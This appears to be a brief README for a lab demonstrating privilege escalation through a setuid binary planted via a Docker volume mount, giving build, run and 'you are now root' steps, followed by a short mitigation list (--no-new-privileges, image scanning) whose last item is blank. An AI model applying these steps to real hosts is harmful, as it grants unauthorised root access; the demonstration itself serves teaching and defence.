
## privilege escalation 

[![asciicast](https://asciinema.org/a/351428.svg)](https://asciinema.org/a/351428)

## How to escalate privilege using setUID : 

Compile c program : 
```
gcc -o rootshell rootshell.c
```

Build the docker images : 
```
docker build -t setuid_hack .
```

Run container : 

```
docker run -v /tmp/persist:/persist setuid_hack:latest /bin/sh root.sh
```

Privilege escalation : 

1. Run `id` command . 
2. execute /tmp/persist/rootshell . 
3. Re-run id command . (You are now root)


## How to resolve this issue : 

1. execute with --no-new-privileges. 
2. Some Image Scanner can detect the use of setUID . 
3. 